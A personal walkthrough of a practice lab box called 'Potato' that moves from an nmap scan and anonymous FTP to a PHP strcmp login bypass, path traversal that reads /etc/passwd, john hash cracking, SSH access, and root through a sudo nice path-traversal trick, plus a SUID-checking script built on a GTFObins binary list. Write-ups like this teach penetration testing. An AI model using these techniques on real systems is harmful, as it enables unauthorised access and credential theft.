
Target is: 192.168.236.101

  

Autorecon takes way too long for me so I'll run nmap for now

nmap -sV -sC -p-  -v 192.168.236.101 --open -oN potato2.scan

I like knowing the serviceVersion and running nmap's sCripts on all ports in case they open some >ridiculous< port out there. -v is good to know if the system crashed or not and I only care about --open things.

Nmap scan report for 192.168.236.101

Host is up (0.071s latency).

Not shown: 61240 closed tcp ports (conn-refused), 4292 filtered tcp ports (no-response)

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit

PORT     STATE SERVICE VERSION

22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   3072 ef240eabd2b316b44b2e27c05f48798b (RSA)

|   256 f2d8353f4959858507e6a20e657a8c4b (ECDSA)

|_  256 0b2389c3c026d5645e93b7baf5147f3e (ED25519)

80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))

|_http-title: Potato company

| http-methods: 

|_  Supported Methods: GET HEAD POST OPTIONS

|_http-server-header: Apache/2.4.41 (Ubuntu)

2112/tcp open  ftp     ProFTPD

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak

|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  

NSE: Script Post-scanning.

Initiating NSE at 08:06

Completed NSE at 08:06, 0.00s elapsed

Initiating NSE at 08:06

Completed NSE at 08:06, 0.00s elapsed

Initiating NSE at 08:06

Completed NSE at 08:06, 0.00s elapsed

Read data files from: /usr/bin/../share/nmap

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 82.11 seconds

  

Now to check out the web port

  

<html>

<head><title>Potato company</title></head>

<body>

  <h1>Potato company</h1>

  <p>At the moment, there is nothing. This site is under construction. To make you wait, here is a photo of a potato:</p>

  <img src="potato.jpg">

</body>

<html>

  

![](https://lh6.googleusercontent.com/l8qw0eol2H0itonRT2YaXRLvY1gcsE4IJ1At43PoTb0ZpN6pfVmCkNJsLuknCetBEQ-604Z8OCE_28T4v66Lx8k=w1280)

Also wtf is up with this potato...

Now time to run directory scans on the web server

  

I like the gui of dirbuster minus the button glitch but I'm debating on using dirb due to it's ease of use or gobuster

  

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

Starting OWASP DirBuster 1.0-RC1

Starting dir/file list based brute forcing

Dir found: / - 200

Dir found: /icons/ - 403

File found: /index.php - 200

Dir found: /admin/ - 200

File found: /admin/index.php - 200

Dir found: /icons/small/ - 403

navigation to admin/index.php

<html>

<head></head>

<body>

  

  

  

  <form action="index.php?login=1" method="POST">

                <h1>Login</h1>

                <label><b>User:</b></label>

                <input type="text" name="username" required>

                </br>

                <label><b>Password:</b></label>

                <input type="password" name="password" required>

                </br>

                <input type="submit" id='submit' value='Login' >

  </form>

</body>

</html>

  

Now to check the weird FTP on 2112

  

ftp 192.168.236.101 2112                                                        08:10:15

Connected to 192.168.236.101.

220 ProFTPD Server (Debian) [::ffff:192.168.236.101]

Name (192.168.236.101:kali): anonymous

331 Anonymous login ok, send your complete email address as your password

Password: 

230-Welcome, archive user anonymous@192.168.45.233 !

230-

230-The local time is: Sun Jun 04 12:10:41 2023

230-

230 Anonymous access granted, restrictions apply

Remote system type is UNIX.

Using binary mode to transfer files.

ftp> ls

229 Entering Extended Passive Mode (|||31513|)

150 Opening ASCII mode data connection for file list

-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak

-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg

226 Transfer complete

ftp>get welcome.msg

ftp>get index.php.bak

 →  cat welcome.msg                                                                 08:13:11

Welcome, archive user %U@%R !

  

The local time is: %T

  

 kali  🏡  OSCP  Potato                                                                  

 →  cat index.php.bak                                                               08:13:13

<html>

<head></head>

<body>

  

<?php

  

$pass= "potato"; //note Change this password regularly

  

if($_GET['login']==="1"){

  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {

    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";

    setcookie('pass', $pass, time() + 365*24*3600);

  }else{

    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";

  }

  exit();

}

?>

  

  

  <form action="index.php?login=1" method="POST">

                <h1>Login</h1>

                <label><b>User:</b></label>

                <input type="text" name="username" required>

                </br>

                <label><b>Password:</b></label>

                <input type="password" name="password" required>

                </br>

                <input type="submit" id='submit' value='Login' >

  </form>

</body>

</html>

  

So try admin:potato...

<html>

<head></head>

<body>

  

<p>Bad user/password! </br> Return to the <a href="index.php">login page</a> <p>

and it didn't take

Looking for ways to bypass their password authentication method yields this databyte

![](https://lh3.googleusercontent.com/hKoKI2bpw5PwEgMssea-YSzKdcGOEHh6tIl-4xucDWal_zXkdgK_y2JJnjT20GAKtKJ2LYJyzhm0kbHvFOsofxqgVfrDOaBnPy1BzfuROvnj3cxmy-V0Xw9LTrajih5t3Q=w1280)

Basically pass the password as an array via password[ ] rather than the original one

Time to load up burp and shoot it over.

I opted to use burp's browser so I get less of a headache with the foxy proxy config

![](https://lh6.googleusercontent.com/M0AkyIsafKiVR25i0ZIYfipXMpsN4vZezu6FSzs__ZMx3gQfn_lxbgqL-3g_djCj_zpi4pG50nCyAJa7I76XNKDC989EV39nhyK5oiQk-bpMTQYBl2oD8zsP9I3KEw3H=w1280)

And I'm logged in 

  

<html>

<head></head>

<body>

  

Welcome! </br> Go to the <a href="dashboard.php">dashboard</a>

Now in the admin dashboard I can see the following with their respective data dumped

  

HOME

Admin area

Access forbidden if you don't have permission to access

USERS

Users list:

- Admin

DATE

The curent time:

Sun Jun 4 12:48:50 UTC 2023

LOGS

Contenu du fichier log_01.txt :

Operation: password change

Date: January 03, 2020 / 11:25 a.m.

User: admin

Status: OK

  

Contenu du fichier log_02.txt :

Operation: reboot the server

Date: January 09, 2020 / 9:55 a.m.

User: admin

Status: OK 

  

Contenu du fichier log_03.txt :

Operation: password change                          

Date: August 2, 2020 / 9:25 p.m.                                             

User: admin                        

Status: OK          

  

So since logs retrieves logs I'll try to retrieve etc/passwd

![](https://lh6.googleusercontent.com/sx2NnSAMhlT355UmFtK_bemOnZPNkDuiIayupmQYczFlVuI-ylEgDLYr4WK0m7YBK6Q1dJI0rP18QM0Qo7k6nva7G21twF_CXhX85Twg1Q1__wrwch6JN7IFinWqZo75tA=w1280)

Cool so that worked. Now to crack the hash for webadmin

webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash

dump hash into a file and run john to attempt to crack it

 →  vi hash                                                                                               08:56:21

 kali  🏡  OSCP  Potato                                                                                        

 →  john hash                                                                                             08:56:28

Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"

Use the "--format=md5crypt-long" option to force loading these as that type instead

Using default input encoding: UTF-8

Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])

Will run 8 OpenMP threads

Proceeding with single, rules:Single

Press 'q' or Ctrl-C to abort, almost any other key for status

Almost done: Processing the remaining buffered candidate passwords, if any.

Proceeding with wordlist:/usr/share/john/password.lst

dragon           (webadmin)     

1g 0:00:00:00 DONE 2/3 (2023-06-04 08:56) 1.388g/s 2416p/s 2416c/s 2416C/s 123456..bigben

Use the "--show" option to display all of the cracked passwords reliably

Session completed. 

  

Great now to login via ssh

ssh webadmin@192.168.236.101                                                                           08:57:30

The authenticity of host '192.168.236.101 (192.168.236.101)' can't be established.

ED25519 key fingerprint is SHA256:9DQds4tRzLVKtayQC3VgIo53wDRYtKzwBRgF14XKjCg.

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '192.168.236.101' (ED25519) to the list of known hosts.

webadmin@192.168.236.101's password: 

Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)

  

 * Documentation:  https://help.ubuntu.com

 * Management:     https://landscape.canonical.com

 * Support:        https://ubuntu.com/advantage

  

  System information as of Sun 04 Jun 2023 12:57:47 PM UTC

  

  System load:  0.0                Processes:               150

  Usage of /:   13.0% of 31.37GB   Users logged in:         0

  Memory usage: 32%                IPv4 address for ens192: 192.168.236.101

  Swap usage:   0%

  

  

118 updates can be installed immediately.

33 of these updates are security updates.

To see these additional updates run: apt list --upgradable

  

  

The list of available updates is more than a week old.

To check for new updates run: sudo apt update

  

  

The programs included with the Ubuntu system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/*/copyright.

  

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by

applicable law.

  

webadmin@serv:~$ ls

local.txt  user.txt

webadmin@serv:~$ cat local.txt 

ef0049166d4698800029939177905f63

Ok now for privesc

First attempt to login to sudo

  

webadmin@serv:~$ sudo -l

[sudo] password for webadmin: 

Sorry, try again.

[sudo] password for webadmin: 

Matching Defaults entries for webadmin on serv:

    env_reset, mail_badpass,

    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  

User webadmin may run the following commands on serv:

    (ALL : ALL) /bin/nice /notes/*

  

Seems I can run nice in the notes directory

Also ran a perm check as well:

webadmin@serv:~$ find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null

  

-rwsr-xr-x 1 root root 55528 Apr  2  2020 /usr/bin/mount

-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at

-rwsr-xr-x 1 root root 166056 Feb  3  2020 /usr/bin/sudo

-rwsr-xr-x 1 root root 88464 Apr 16  2020 /usr/bin/gpasswd

-rwsr-xr-x 1 root root 39144 Apr  2  2020 /usr/bin/umount

-rwsr-xr-x 1 root root 31032 Aug 16  2019 /usr/bin/pkexec

-rwsr-xr-x 1 root root 85064 Apr 16  2020 /usr/bin/chfn

-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount

-rwsr-xr-x 1 root root 44784 Apr 16  2020 /usr/bin/newgrp

-rwsr-xr-x 1 root root 67816 Apr  2  2020 /usr/bin/su

-rwsr-xr-x 1 root root 53040 Apr 16  2020 /usr/bin/chsh

-rwsr-xr-x 1 root root 68208 Apr 16  2020 /usr/bin/passwd

-rwsr-xr-x 1 root root 473576 May 29  2020 /usr/lib/openssh/ssh-keysign

-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device

-rwsr-xr-- 1 root messagebus 51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

-rwsr-xr-x 1 root root 130152 Jul 10  2020 /usr/lib/snapd/snap-confine

-rwsr-xr-x 1 root root 22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1

-rwsr-xr-x 1 root root 110792 Sep  4  2020 /snap/snapd/9279/usr/lib/snapd/snap-confine

-rwsr-xr-x 1 root root 110792 Jul 10  2020 /snap/snapd/8542/usr/lib/snapd/snap-confine

-rwsr-xr-x 1 root root 43088 Mar  5  2020 /snap/core18/1885/bin/mount

-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1885/bin/ping

-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/1885/bin/su

-rwsr-xr-x 1 root root 26696 Mar  5  2020 /snap/core18/1885/bin/umount

-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/1885/usr/bin/chfn

-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/1885/usr/bin/chsh

-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd

-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/1885/usr/bin/newgrp

-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/1885/usr/bin/passwd

-rwsr-xr-x 1 root root 149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo

-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper

-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign

-rwsr-xr-x 1 root root 43088 Mar  5  2020 /snap/core18/1880/bin/mount

-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1880/bin/ping

-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/1880/bin/su

-rwsr-xr-x 1 root root 26696 Mar  5  2020 /snap/core18/1880/bin/umount

-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/1880/usr/bin/chfn

-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/1880/usr/bin/chsh

-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/1880/usr/bin/gpasswd

-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/1880/usr/bin/newgrp

-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/1880/usr/bin/passwd

-rwsr-xr-x 1 root root 149080 Jan 31  2020 /snap/core18/1880/usr/bin/sudo

-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper

-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/1880/usr/lib/openssh/ssh-keysign

  

I synthesized a script that does this check and checks for the GTFObins list

#!/bin/bash

  

  

#This script will output the full information of any SUID files that are also listed as potentially dangerous according to your Gtfobins list.

#Remember to run the script with appropriate permissions to ensure it can access and check all files.

  

# List of dangerous binaries - this list is based on the Gtfobins list you provided

Gtfobins_list=(

"7z"

"aa-exec"

"ab"

"agetty"

"alpine"

"ansible-playbook"

"ansible-test"

"aoss"

"apt-get"

"apt"

"ar"

"aria2c"

"arj"

"arp"

"as"

"ascii-xfr"

"ascii85"

"ash"

"aspell"

"at"

"atobm"

"awk"

"aws"

"base32"

"base58"

"base64"

"basenc"

"basez"

"bash"

"batcat"

"bc"

"bconsole"

"bpftrace"

"bridge"

"bundle"

"bundler"

"busctl"

"busybox"

"byebug"

"bzip2"

"c89"

"c99"

"cabal"

"cancel"

"capsh"

"cat"

"cdist"

"certbot"

"check_by_ssh"

"check_cups"

"check_log"

"check_memory"

"check_raid"

"check_ssl_cert"

"check_statusfile"

"chmod"

"choom"

"chown"

"chroot"

"cmp"

"cobc"

"column"

"comm"

"composer"

"cowsay"

"cowthink"

"cp"

"cpan"

"cpio"

"cpulimit"

"crash"

"crontab"

"csh"

"csplit"

"csvtool"

"cupsfilter"

"curl"

"cut"

"dash"

"date"

"dd"

"debugfs"

"dialog"

"diff"

"dig"

"distcc"

"dmesg"

"dmidecode"

"dmsetup"

"dnf"

"docker"

"dos2unix"

"dosbox"

"dotnet"

"dpkg"

"dstat"

"dvips"

"easy_install"

"eb"

"ed"

"efax"

"elvish"

"emacs"

"env"

"eqn"

"espeak"

"ex"

"exiftool"

"expand"

"expect"

"facter"

"file"

"find"

"finger"

"fish"

"flock"

"fmt"

"fold"

"fping"

"ftp"

"gawk"

"gcc"

"gcloud"

"gcore"

"gdb"

"gem"

"genie"

"genisoimage"

"ghc"

"ghci"

"gimp"

"ginsh"

"git"

"grc"

"grep"

"gtester"

"gzip"

"hd"

"head"

"hexdump"

"highlight"

"hping3"

"iconv"

"iftop"

"install"

"ionice"

"ip"

"irb"

"ispell"

"jjs"

"joe"

"join"

"journalctl"

"jq"

"jrunscript"

"jtag"

"julia"

"knife"

"ksh"

"ksshell"

"ksu"

"kubectl"

"latex"

"latexmk"

"ld.so"

"ldconfig"

"less"

"lftp"

"ln"

"loginctl"

"logsave"

"look"

"lp"

"ltrace"

"lua"

"lualatex"

"luatex"

"lwp-download"

"lwp-request"

"mail"

"make"

"man"

"mawk"

"more"

"mosquitto"

"mount"

"msfconsole"

"msgattrib"

"msgcat"

"msgconv"

"msgfilter"

"msgmerge"

"msguniq"

"mtr"

"multitime"

"mv"

"mysql"

"nano"

"nasm"

"nawk"

"nc"

"ncftp"

"neofetch"

"nft"

"nice"

"nl"

"nm"

"nmap"

"node"

"nohup"

"npm"

"nroff"

"nsenter"

"octave"

"od"

"openssl"

"openvpn"

"openvt"

"opkg"

"pandoc"

"paste"

"pax"

"pdb"

"pdflatex"

"pdftex"

"perf"

"perl"

"perlbug"

"pexec"

"pg"

"php"

"pic"

"pico"

"pidstat"

"pip"

"pkexec"

"pkg"

"posh"

"pr"

"pry"

"psftp"

"psql"

"ptx"

"puppet"

"pwsh"

"python"

"rake"

"rc"

"readelf"

"red"

"redcarpet"

"redis"

"restic"

"rev"

"rlogin"

"rlwrap"

"rpm"

"rpmdb"

"rpmquery"

"rpmverify"

"rsync"

"rtorrent"

"ruby"

"run-mailcap"

"run-parts"

"rview"

"rvim"

"sash"

"scanmem"

"scp"

"screen"

"script"

"scrot"

"sed"

"service"

"setarch"

"setfacl"

"setlock"

"sftp"

"sg"

"shuf"

"slsh"

"smbclient"

"snap"

"socat"

"socket"

"soelim"

"softlimit"

"sort"

"split"

"sqlite3"

"sqlmap"

"ss"

"ssh-agent"

"ssh-keygen"

"ssh-keyscan"

"ssh"

"sshpass"

"start-stop-daemon"

"stdbuf"

"strace"

"strings"

"su"

"sysctl"

"systemctl"

"systemd-resolve"

"tac"

"tail"

"tar"

"task"

"taskset"

"tasksh"

"tbl"

"tclsh"

"tcpdump"

"tdbtool"

"tee"

"telnet"

"tex"

"tftp"

"tic"

"time"

"timedatectl"

"timeout"

"tmate"

"tmux"

"top"

"torify"

"torsocks"

"troff"

"tshark"

"ul"

"unexpand"

"uniq"

"unshare"

"unzip"

"update-alternatives"

"uudecode"

"uuencode"

"vagrant"

"valgrind"

"vi"

"view"

"vigr"

"vim"

"vimdiff"

"vipw"

"virsh"

"volatility"

"w3m"

"wall"

"watch"

"wc"

"wget"

"whiptail"

"whois"

"wireshark"

"wish"

"xargs"

"xdotool"

"xelatex"

"xetex"

"xmodmap"

"xmore"

"xpad"

"xxd"

"xz"

"yarn"

"yash"

"yelp"

"yum"

"zathura"

"zip"

"zsh"

"zsoelim"

"zypper"

)

  

# Finding all files with SUID permission

file_list=$(find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null | awk '{print $NF}')

  

# For each file in the file list

while read -r line; do

    # Get the base name of the file

    filename=$(basename "$line")

    # For each dangerous binary in Gtfobins list

    for bin in "${Gtfobins_list[@]}"; do

        # If the filename is in the Gtfobins list

        if [[ "$filename" == "$bin" ]]; then

            # Print out the full file information

            echo "$line is a potentially dangerous binary with SUID permission"

        fi

    done

done <<< "$file_list"

Tangent completed

  

Ok so since nice had sudo privileges as long as it was run from notes then the script to open up a bash shell was ran via nice at the notes directory then traversed to point top the webadmin home directory

  

webadmin@serv:~$ echo "/bin/bash" >> root.sh

webadmin@serv:~$ chmod +x root.sh

webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/root.sh 

[sudo] password for webadmin: 

root@serv:/home/webadmin# whoami

root

root@serv:/home/webadmin# cd ~

root@serv:~# ls

proof.txt  root.txt  snap

root@serv:~# cat proof.txt 

24d0418268f96bf641244a5180bc0a6d

root@serv:~# 

Boot2Root